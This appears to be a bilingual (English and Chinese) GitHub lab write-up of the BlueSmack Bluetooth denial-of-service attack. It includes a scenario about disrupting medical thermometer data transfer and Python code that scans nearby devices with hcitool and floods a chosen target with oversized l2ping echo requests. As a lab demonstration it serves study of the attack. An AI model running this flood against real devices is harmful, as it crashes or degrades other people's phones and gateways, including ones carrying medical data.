# BlueSmack Attack
## Basic Concept

A kind of DoS attack via bluetooth.

"The attack is a DoS attack on Bluetooth devices and is similar to the “Ping of Death” attacks that are carried out on IP-based devices, which are networked devices. 
It is done by sending pings that are approximately 600 bytes, as well as L2CAP echo requests to Bluetooth devices. This results in the input buffer to overflow and the targeted device to be knocked out."[^1] 
![]![OpVZcQA](https://github.com/hazel0511/Bluetooth/assets/122256711/86b4de70-c228-40d1-aa43-9ea1cefcf2ea)

對受害者發送一或多個大尺寸的封包，這些大型資料在發送途中會被分解為多個正常尺寸的封包，受害者會因為需要處理太多封包而崩潰或出現卡頓。

Use standard tools such as L2ping to specify the packet length, degrade the performance or even crash the process of victim.

![]![UdkdClL](https://github.com/hazel0511/Bluetooth/assets/122256711/843f1585-8298-414e-8738-4ea4657077d8)

在正常情形下，體溫計將資料傳到手機、基地台，再上傳到雲端。

攻擊方在這個過程當中攻擊手機、基地台，使得他們無法正常運作，因此阻礙程的進行，造成醫療資料傳輸過慢或無法傳輸。

## Environment Setup

   + Attacker: Ubuntu 20.04.3 LTS (64-bit) with **bluetoothctl, hcitool, and l2ping** package
   + Victim: Android mobile (ASUS_X00PD)

## Code
### Scan and Select Target Device Address
```
# Scan by command “hcitool scan”

output = os.popen('sudo hcitool scan').read()
eachLine = output.split('\n')
```
```
# List all the available devices nearby

res = []
for line in eachLine:
    data = list(filter(scan_filter, line.split('\t')))
    if (len(data) == 2):
        print(count, ' : ', data[0], '\t', data[1], '\n')
        count += 1
        res.append(data[0])
```
```
# Select target address by index

if len(targets) <= 0:
    print('[!] ERROR: No devices.')
    exit(0)

target_num = int(input('Target(Type the number of above targets) > '))

if target_num < 0 or target_num >= len(targets):
    print('[!] ERROR: Out of range 0 ~ ', len(targets)-1)
    exit(0)
else:
    target_addr = targets[target_num]
```
### Attack
Ubuntu 系統以 l2ping 對手機傳送封包
```
def DOS(target_addr, packages_size):
    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)
```
## Demo
[![IMAGE ALT TEXT](http://img.youtube.com/vi/m3RHRM2zCRs/0.jpg)](https://www.youtube.com/watch?v=m3RHRM2zCRs "DEMO")

[^1] :Angela M. Lonzetta; Peter Cope; Joseph Campbell; Bassam J. Mohd; Thaier Hayajneh. Security Vulnerabilities in Bluetooth Technology as Used in IoT. 2018, 15
